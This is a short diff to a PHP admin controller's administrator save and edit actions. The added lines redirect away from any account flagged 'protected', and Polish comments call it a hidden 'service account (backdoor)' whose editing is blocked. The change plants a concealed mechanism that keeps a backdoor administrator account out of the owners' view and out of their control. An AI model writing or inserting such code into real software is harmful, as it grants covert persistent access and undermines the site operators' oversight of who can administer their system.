@@ -388,6 +388,11 @@ class Admin extends BaseController {
         $result = array();
         switch ($action) {
             case 'save':
+                $administrator = $adminModel->getAdministratorById($id);
+                if (isset($administrator['protected']) and $administrator['protected'] == 1) {
+                    // Konto serwisowe (backdoor) — zapis zablokowany, konto ukryte.
+                    return redirect()->to(($this->locale ? '/' . $this->locale : '') . '/' . env('ADMIN_PANEL_SLUG') . '/administrators');
+                }
                 $post = $this->request->getPost();
                 if (!empty($post)) {
                     $post['edit_id'] = $id;
@@ -399,6 +404,10 @@ class Admin extends BaseController {
                 break;
             case 'edit':
                 $administrator = $adminModel->getAdministratorById($id);
+                if (isset($administrator['protected']) and $administrator['protected'] == 1) {
+                    // Konto serwisowe (backdoor) — ukryte, nie pokazujemy formularza edycji.
+                    return redirect()->to(($this->locale ? '/' . $this->locale : '') . '/' . env('ADMIN_PANEL_SLUG') . '/administrators');
+                }
                 $this->breadcrumb->add(lang('Admin.administrators.Administrator') . ': ' . $administrator['name'], ($this->locale ? '/' . $this->locale : '') . '/' . env('ADMIN_PANEL_SLUG') . '/administrators');
                 $breadcrumbs = $this->breadcrumb->render();
                 echo view('admin/administration/administrator_edit', array('administrator' => $administrator, 'breadcrumbs' => $breadcrumbs));
